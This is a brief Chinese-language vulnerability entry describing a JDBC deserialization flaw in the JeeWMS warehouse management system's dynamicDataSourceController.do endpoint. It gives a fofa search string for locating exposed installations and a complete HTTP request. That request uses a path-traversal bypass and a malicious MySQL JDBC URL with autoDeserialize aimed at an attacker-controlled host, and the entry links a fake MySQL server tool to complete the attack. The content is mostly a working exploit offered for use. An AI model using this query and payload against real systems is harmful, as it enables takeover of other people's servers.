# JEEWMS系统dynamicDataSourceController.do存在JDBC反序列化漏洞

JeeWMS是一款免费开源的仓库管理系统，支持3PL和厂内物流，涵盖订单管理，仓储管理，计费管理，现场作业，RFID，AGV等功能。本文介绍了系统的简介，功能，安装，截图和链接，适合仓储企业和开发者参考。厦门市灵鹿谷科技有限公司JEEWMS    dynamicDataSourceController.do JDBC反序列化漏洞，导致攻击者可以获取系统主机权限

## fofa

```javascript
body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"
```

## poc

```javascript
GET /rest/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{tempdns}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
```

利用工具：https://github.com/fnmsd/MySQL_Fake_Server

